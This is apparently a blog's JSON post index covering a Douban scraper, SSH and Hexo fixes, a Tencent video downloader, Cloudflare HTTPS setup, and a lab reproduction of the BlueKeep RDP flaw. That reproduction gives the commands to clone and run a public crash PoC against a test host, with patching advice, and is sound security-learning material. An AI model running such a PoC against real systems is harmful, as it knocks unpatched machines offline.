headers)\nsoup = BeautifulSoup(res.text,'html.parser')\n```\n在soup中含有这些链接，soup.select()是列表类型，有的列表项含有URL，有的不含有，并且在调试过程中发现有的含有链接的却没有评分信息。\n因此在以下语句中URL利用select存到urls中，利用判断语句来筛选掉一些没有评分的电影。\n```\npools = []\nfor links in soup.select('ul'):\n    urls = links.select('a')[0]['href']\n    if len(links.select('.subject-rate')) > 0 :\n        pools.append(pages(urls))\n```\n最终，每个URL的信息都被添加到pools数组中，但是这个时候直接输出pools会很乱，因此接下来要做的就是生成表格。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm13.png)\n# 五、表格生成\n生成表格的方法也非常简单\n```\nimport pandas\ndf = pandas.DataFrame(pools)\ndf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm14.png)\n不过这样不够明显，因此我们可以将简介放到后面，再排序一下\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm15.png)\n# 六、总结\n上面一张图可以明显看到今天的四个贺岁电影中，《流浪星球》不管是豆瓣评分还是评论的数量都是第一个，倒也是实至名归。\n在整个过程中，碰到了很多问题，其中不乏有还未解决的问题，比如在提取电影标签的时候，因为正则使用的不熟而一直没有被很好的提取出来。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm16.png)\n在做这个数据挖掘之前，还做了新浪新闻的信息抓取，这个电影信息的数据挖掘也相当于是练练手，后面还有的导出文档、导出到数据库的功能就没有做演示了，也是几行代码的事情。\n用了一段时间Python后，真的不得不感叹到Python的强大之处，下面就把以上项目的全部代码展示出来吧，另外我还是个新手，代码写得十分笨拙，大佬还请绕步。\n```\nimport re\nimport pandas\nimport requests\nfrom bs4 import BeautifulSoup\n\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}\nurl = 'https://movie.douban.com/cinema/nowplaying/beijing/'\nres = requests.get(url,headers = headers)\nsoup = BeautifulSoup(res.text,'html.parser')\npools = []\nfor links in soup.select('ul'):\n    urls = links.select('a')[0]['href']\n    if len(links.select('.subject-rate')) > 0 :\n        pools.append(pages(urls))\ndf = pandas.DataFrame(pools,columns = ['电影名','豆瓣评分','评论数量','简介'])\ndf.sort_values('豆瓣评分',inplace = True,ascending = False)\ndf\n\ndef pages(url):\n    result = {}\n    inres = requests.get(url,headers = headers)\n    insoup = BeautifulSoup(inres.text,'html.parser')\n    \n    result['电影名'] = insoup.select('h1')[0].text.split()[0]\n    result['豆瓣评分'] = insoup.select('.rating_num')[0].text\n    result['评论数量'] = insoup.select('.mod-hd a')[1].text.split()[1]\n    result['简介'] = re.sub('\\s','',insoup.select('.related-info span')[0].text)\n    \n    return result\n```","tags":["Python","电影","爬虫"],"categories":["实例演示"]},{"title":"【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？","url":"/year/190615-013724.html","content":"# 0x00 前言\n>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。\n\n以上内容来自360网络安全响应中心。\n从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07081.gif)\n看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。\n直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。\n早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。\n# 0x01 下载POC \n首先git clone代码\n```\ngit clone https://github.com/n1xbyte/CVE-2019-0708.git\ncd CVE-2019-0708\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07082.png)\n# 0x02 开始复现\n1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。\n2、被攻击机的IP地址与操作系统信息如下：\n```\n#被攻击主机\nip地址：192.168.1.106\n系统类型：64位\n```\n3、安装需要的库后执行POC\n```\npip3 install impacket\npython3 crashpoc.py 192.168.1.106 64  #python3 crashpoc.py ip地址 系统类型\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07083.png)\nPOC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。\n# 0x03 修复方案\n1、最简便的方法就是安装一个安全管家，比如火绒、360之类的\n2、把系统的自动更新打开或者到微软官网[下载补丁](https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708)\n3、把自己电脑上的远程桌面关掉、防火墙开启\n# 0x04 小结\n总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。\n\n**最后再次强调，不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。**\n\n\n下面为视频演示：\n\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55626994&cid=97251766&page=1\" \" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[视频地址](https://www.bilibili.com/video/av55626994/ \"视频地址\")进行观看。","tags":["漏洞复现","CVE 2019-0708"],"categories":["漏洞复现"]},{"title":"对于连接ssh时连时断的解决方法","url":"/year/190614-134948.html","content":"# 0x00 前言\n最近用ssh连接VPS的时候，发生了很诡异的事件，有时能够连接上ssh，有时就死活连接不上，重新安装、公钥私钥都检查了，各种权限也都没有问题，端口监听地址什么的也都配置正常，总之能想到的办法都想过了，此时连不连的上仿佛就要看脸了，下面记录一下最终的解决办法。\n<!--more-->\n# 0x01 修改配置文件\n```\nvim /etc/ssh/sshd_config\n```\n在配置文件中加入以下内容：\n```\nUseDNS no\n```\n之后重启ssh即可\n```\n#Ubuntu:\nservice sshd restart 或者 /etc/init.d/sshd restart\n#Centos7:\nsystemctl restart sshd.service\n#Centos7以下版本：\nservice sshd restart\n```\n# 0x02 原因\n以下解释来自本文方法参考文章：[文章地址](https://m.ancii.com/ayew4gv3/)\n\n>ssh登录服务器时总是要停顿等待一下才能连接上,这是因为OpenSSH服务器有一个DNS查找选项UseDNS默认是打开的。\n>UseDNS选项打开状态下,当客户端试图登录OpenSSH服务器时,服务器端先根据客户端的IP地址进行DNS PTR反向查询,查询出客户端的host name，然后根据查询出的客户端host name进行DNS 正向A记录查询，验证与其原始IP地址是否一致，这是防止客户端欺骗的一种手段,但一般我们的IP是动态的，不会有PTR记录的，打开这个选项不过是在白白浪费时间而已。","tags":["解决方案","ssh"],"categories":["经验总结"]},{"title":"hexo自适应BiliBili视频大小的解决方案","url":"/year/190614-111512.html","content":"\n# 0x00 未修改\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili1.png)\n```\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n```\n直接将B站中的视频插入地址放入文章MarkDown中的效果如下：\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>  \n\n这个视频也太小了，而且不能全屏，很难受，于是在网上看到有人用自定义调节视频的高宽。\n# 0x01 自定义高宽\n```\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" width=\"780\" height=\"480\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n```\n就是在原来的基础上加入了宽高，效果类似这样：\n<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" width=\"780\" height=\"480\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>  \n  \n\n自定义调节视频高宽虽然可以解决这个问题，但是手机上又是另一翻景象，你看：  \n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili2.png)\n\n这就更难受了，于是在网上找遍各种自适应视频大小的方案，最终找到以下这种方案。\n# 0x02 自适应视频大小\n```\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n```\n只需要把你的视频地址和上面的视频地址替换一下就行，最后效果如下：\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>  \n\n手机上也能很好的自适应：   \n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili3.png)\n\n不过发现依然不能全屏播放，还是有些美中不足，所以只好也将视频播放链接放到视频下面了，如果不能全屏就只能去源链接去看了，如果你有更好的解决方法，欢迎下方留言。\n# 0x03 致谢\n本文中的自适应解决方案来自这篇文章：[文章地址](https://www.andyvj.com/2019/02/12/190213-01/)，里面还介绍了其他音视频平台插入的方法，在这里也谢谢这位老哥了。\n\n","tags":["BiliBili","自适应视频大小","解决方案"],"categories":["经验总结"]},{"title":"【Python实例】批量下载斗罗大陆高清视频","url":"/year/190613-191825.html","content":"# 0x00 下载视频下载脚本\n首先来到我的[Github主页](http://www.github.com/teamssix/ )，找到Douluo-download项目，点开找到[下载地址](https://github.com/teamssix/Douluo-download.git)，使用git clone对其进行下载\n<!--more-->\n```\ngit clone https://github.com/teamssix/Douluo-download.git\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo1.png)\n# 0x01 安装python所需要的库\n```\ncd Douluo-download/\npip3 install -r requirements.txt\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo2.png)\n# 0x02 执行Python程序\n```\npython3 douluo.py\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo3.png)\n程序在执行的时候会感觉比较慢，其实不是卡了，而是程序正在下载视频，当下载好一个视频才会弹出一条信息。\n# 0x03 查看成果\n执行ls命令可以看到刚才下载的视频\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo4.png)\n播放看看能不能正常播放\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo5.png)\n可以看到是可以正常播放的，不过我想试试最新的一集，也就是看看需要会员的视频能不能下载下来，当前最新的一集是55集，那我们下载试试。\n# 0x04 继续尝试下载VIP视频\n知道下载那一集后还需要修改一下代码才行，将原来下载视频的代码简单做一下修改就行\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo6.png)\n执行看看\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo7.png)\n看来不行，只能下载到预告片，接下来就对代码就行简单的介绍吧\n# 0x05 代码简单介绍\n## 1、第一部分：导入库设定变量\n```\n#导入库设定变量\nimport os\nimport requests\nfrom bs4 import BeautifulSoup\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36'}\nhome_url ='https://v.qq.com/x/cover/m441e3rjq9kwpsc/m00253deqqo.html'\n```\n这部分就是导入一些库和一些设定的变量什么的，比如headers、url什么的，没什么好说的\n## 2、第二部分：爬取每个视频的id\n```\n#爬取每个视频的id\ndouluohome = requests.get(home_url,headers=headers)\ndouluohome.encoding='utf-8'\ndouluosoup = BeautifulSoup(douluohome.text,'html.parser')\ndouluolist = douluosoup.select('.mod_episode')[0].select('a')\n```\n这里用到了BeautifulSoup4库，先requets获取页面信息，用BeautifulSoup4去对页面html进行解析，最后找到我们想要的东西，这里是清洗出每个视频的ID\n## 3、第三部分：合成下载链接\n```\n#合成下载链接\nlists = []\nfor i in range(len(douluolist)):\n    lists.append('https://v.qq.com'+douluolist[i]['href'])\n```\n很简单的一个处理，将上一步获取的视频的id加到v.qq.com后面，生成视频的播放链接\n## 4、第四部分：开始下载视频\n```\n#开始下载视频\nfor i in range(len(lists)):\n    try:\n        print(os.popen('you-get {}'.format(lists[i])).read()) #视频会下载到当前目录\n    except:\n        pass\n    continue\n```\n这部分其实也没有什么东西，有了每个视频的播放链接后，直接使用工具就可以下载了，这里使用的是利用os库调用you-get命令进行下载的，最后将you-get命令的显示结果传回终端。\n# 0x06 总结\n总的说来，其实Python主要就是起到爬虫作用，爬取每个视频的播放链接，最后使用you-get对视频进行下载，没有什么太大的难度，所以权当练练手了。\n\n下面为视频演示：\n<!--<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>-->\n\n\n\n\n<!--<p align = \"center\"><iframe height=auto width=100% src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\"></iframe></p>-->\n\n<!--<iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" width=\"780\" height=\"480\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>-->\n\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\"><iframe src=\"//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"> </iframe></div>\n\n如果视频不能全屏播放，请点击[源链接](https://www.bilibili.com/video/av55224540/ \"源链接\")观看。","tags":["Python","斗罗大陆","GitHub"],"categories":["实例演示"]},{"title":"为自定义域名的Hexo博客升级到Https网站","url":"/year/191612-123700.html","content":"# 0x00 前言\n一把小绿锁，增加安全与安全感。cloudflare 是一家国外的CDN加速服务商，我们可以用它来把我们的网站升级到https，同时还能够提高网站的访问速度。\n如果在设置的过程中，因为网站太多英文而困扰，可以利用浏览器的一些插件进行翻译，比如Chrome自带的翻译。\n我使用的域名提供商是namesilo，博客工具是hexo，在网上找到很多教程都是用的Github官方提供的升级到https的教程，要不就是各种命令，然后按照教程去配置就各种依赖报错，十分心累。\n本文配置过程中，没有涉及到命令的地方，利用CloudFlare配置https，整体体验还是很是很不错的，而且还能一定程度上的伪装自己的真实IP地址，废话不多说，下面就开整吧。\n<!--more-->\n# 0x01 注册**CloudFlare**\n打开注册地址[https://dash.cloudflare.com/sign-up](https://dash.cloudflare.com/sign-up)，输入邮箱和密码，对于下面是否接收广告的选项我是取消勾选，可以自行选择，勾选了平时邮箱会接收到来自CloudFlare的广告。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https1.png)\n此时邮箱会收到验证邮件，点击Verify email按钮，跳转到登陆界面，输入正确的账号密码后，才算是验证成功。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https2.png)\n# 0x02 添加配置网站\n回到Cloudflare页面，输入自己的域名\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https3.png)\n网页提示正在查询你的DNS记录，点击Next\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https4.png)\n这里我选择0元/月，也就是免费的，具体每个Plan是什么意思，可以看下面翻译后的图片，选择后之后，点击Confirm plan\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https5.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https6.png)\n弹出提示信息，问我们是否确认购买这个plan，我们直接确认，点击Confirm\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https7.png)\n将所有DNS记录删除，添加类型为A，Name为www，Value为你的IP地址，TTL为自动的一条记录后，点击Continue\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https8.png)接下来需要修改你的域名服务器，这就需要到你购买域名的地方去修改了，我的域名是在namesilo购买的，因此这里以namesilo为例。\n这里可以先把下图中红色框中的内容先复制下来。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https9.png)\n# 0x03 配置域名服务器\n打开自己购买域名的地方，这里我打开的是namesilo官网，对于其他域名网站都类似，具体配置域名服务器的教程可以谷歌之。\n进入官网登陆后，点击Manage My Domains\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https10.png)\n选择需要修改的域名后，点击Change Nameservers，namesilo默认有3个Nameservers，我这里之前已经修改过了，所以NameServers栏中会和默认的不一样。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https11.png)\n先将原来信息删除，将上面复制的内容逐一复制进去即可，点击SUBMIT，这里因为我已经修改过了，因此界面会显示不大一样。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https12.png)\n回到CloudFlasre页面，点击Continue，跳转到以下界面，稍等一段时间，来到namesilo查看配置进度\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https13.png)\n下面Status显示Active说明域名服务器就已经配置好了。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https14.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https15.png)\n# 0x04 配置SSL\n来到Crypto，点击using SSl\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https16.png)\n点击Sign up\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https17.png)\n跳转到如下界面\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https18.png)\n等待一段时间，少则几十分钟一个小时，多则24小时，见到下面红色框内容出现，说明SSl配置就成功了\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https19.png)\n此时登陆我们的域名就可以看到高贵的安全锁标志了。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https20.png)\n# 0x05 设置Always Use HTTPS规则\n虽然设置了http，但是发现输入域名还是会自动以http协议连接，因此我们来到Page Rules添加一下规则。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https21.png)\n第一个框填写自己的域名，接着选择Always Use HTTPS，点击Save and Deploy。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/https22.png)\n同样需要等待一段时间，输入自己域名后就可以发现可以直接跳转到https了。\n# 0x06 总结\n除此之外在宝塔上配置https也是很方便的，不过因为担心宝塔配置Web的过程中安装的LNMP什么的和本地一些已经安装好的环境发生冲突，最后还是没有继续选择使用宝塔，于是在网上查找了很多将http升级为https的方法，但基本都是用的国内的云，都有自带的证书服务，并不适用于我的情况，最后看到这篇文章：[文章链接](https://zhouhengheng.com/%E5%AE%9E%E7%8E%B0Hexo%E5%8D%9A%E5%AE%A2%E4%BB%8EHTTP%E5%88%B0HTTPS%E5%8A%A0%E5%AF%86.html)，不过写的比较简陋，于是结合这篇文章以及自己的摸索，记录下这篇文章。\n\n","tags":["Hexo","Https","CloudFlare","Namesilo"],"categories":["经验总结"]}]